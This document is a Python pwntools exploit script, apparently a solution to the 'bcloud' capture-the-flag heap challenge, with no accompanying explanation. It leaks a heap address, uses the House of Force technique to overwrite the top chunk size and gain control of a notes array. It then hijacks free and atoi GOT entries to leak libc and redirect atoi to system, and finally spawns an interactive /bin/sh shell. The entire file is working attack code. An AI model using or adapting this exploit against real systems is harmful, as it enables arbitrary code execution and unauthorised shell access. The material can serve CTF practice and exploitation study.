#!/usr/bin/env python

from pwn import *

#context.log_level = 'debug'

io = process(['./bcloud'], env={'LD_PRELOAD':'./libc-2.19.so'})
elf = ELF('bcloud')
libc = ELF('libc-2.19.so')

bss_addr  = 0x0804b0a0

def new(length, content):
    io.sendlineafter("option--->>\n", '1')
    io.sendlineafter("content:\n", str(length))
    io.sendlineafter("content:\n", content)

def edit(idx, content):
    io.sendlineafter("option--->>\n", '3')
    io.sendline(str(idx))
    io.sendline(content)

def delete(idx):
    io.sendlineafter("option--->>\n", '4')
    io.sendlineafter("id:\n", str(idx))

def leak_heap():
    global leak

    io.sendafter("name:\n", "A" * 0x40)
    leak = u32(io.recvuntil('! Welcome', drop=True)[-4:])
    log.info("leak heap address: 0x%x" % leak)

def house_of_force():
    io.sendafter("Org:\n", "A" * 0x40)
    io.sendlineafter("Host:\n", p32(0xffffffff))    # overflow

    new((bss_addr - 0x8) - (leak + 0xd0) - 0x8 - 4, 'AAAA') # 0xd0 = top chunk - leak

    payload  = "A" * 0x80
    payload += p32(elf.got['free'])         # notes[0]
    payload += p32(elf.got['atoi']) * 2     # notes[1], notes[2]
    new(0x8c, payload)

def leak_libc():
    global system_addr

    edit(0, p32(elf.plt['puts']))   # free@got.plt -> puts@plt

    delete(1)                       # puts(atoi_addr)
    io.recvuntil("id:\n")
    leak_atoi_addr = u32(io.recvn(4))
    libc_base = leak_atoi_addr - libc.symbols['atoi']
    system_addr = libc_base + libc.symbols['system']

    log.info("leak atoi address: 0x%x" % leak_atoi_addr)
    log.info("libc base: 0x%x" % libc_base)
    log.info("system address: 0x%x" % system_addr)

def pwn():
    edit(2, p32(system_addr))       # atoi@got.plt -> system@got.plt
    io.sendline("/bin/sh\x00")

    io.interactive()

if __name__ == '__main__':
    leak_heap()
    house_of_force()
    leak_libc()
    pwn()
